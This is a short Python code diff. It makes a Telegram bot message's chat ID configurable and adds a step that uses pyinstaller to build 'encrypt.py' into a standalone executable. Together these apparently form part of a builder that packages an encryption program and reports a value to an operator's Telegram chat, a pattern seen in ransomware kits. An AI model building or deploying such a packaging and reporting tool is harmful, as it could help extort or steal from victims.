@@ -72,8 +72,8 @@ def soc():
 
 
 
-def soc2(token,num):
-    url = ("https://api.telegram.org/bot{token}/sendmessage?chat_id=1235363769&text={k}".format(k=str(num),token=token))
+def soc2(token,id,num):
+    url = ("https://api.telegram.org/bot{token}/sendmessage?chat_id={chat_id}&text={k}".format(k=str(num),token=token,chat_id = id))
 
     payload = {"UrlBox":url,
                
@@ -86,4 +86,4 @@ def soc2(token,num):
 
 def soc3():
     os.system("pyinstaller --onefile encrypt.py")
-    print("Your Exe File Is Building!Go To /dist")
+    print(Fore.RED+"\n [!] Your Exe File Is Building!Go To /dist Folder")
